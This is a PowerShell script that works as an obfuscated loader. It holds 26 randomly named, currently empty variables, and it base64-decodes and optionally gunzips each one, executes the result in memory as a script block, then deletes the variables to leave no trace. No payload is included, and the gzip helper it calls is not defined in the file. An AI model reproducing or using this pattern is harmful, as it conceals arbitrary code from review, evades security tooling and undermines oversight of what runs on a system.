#Requires -Version 2

$Emaciating = ""
$Disgruntle = ""
$Structures = ""
$Infectious = ""
$Interfaith = ""
$Stentorian = ""
$Protectors = ""
$Emanations = ""
$Disguising = ""
$Stultified = ""
$Infidelity = ""
$Interjects = ""
$Stereotype = ""
$Protoplasm = ""
$Emasculate = ""
$Disgusting = ""
$Stuttering = ""
$Infiltrate = ""
$Interleave = ""
$Stewarding = ""
$Protruding = ""
$Phlegmatic = ""
$Lubricants = ""
$Cuttlefish = ""
$Battalions = ""
$Sunburning = ""

$Modules = @($Emaciating,$Disgruntle,$Structures,$Infectious,$Interfaith,$Stentorian,$Protectors,$Emanations,$Disguising,$Stultified,$Infidelity,$Interjects,$Stereotype,$Protoplasm,$Emasculate,$Disgusting,$Stuttering,$Infiltrate,$Interleave,$Stewarding,$Protruding,$Phlegmatic,$Lubricants,$Cuttlefish,$Battalions,$Sunburning)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Emaciating","Disgruntle","Structures","Infectious","Interfaith","Stentorian","Protectors","Emanations","Disguising","Stultified","Infidelity","Interjects","Stereotype","Protoplasm","Emasculate","Disgusting","Stuttering","Infiltrate","Interleave","Stewarding","Protruding","Phlegmatic","Lubricants","Cuttlefish","Battalions","Sunburning") | ForEach-Object { Remove-Variable -Name $_ }
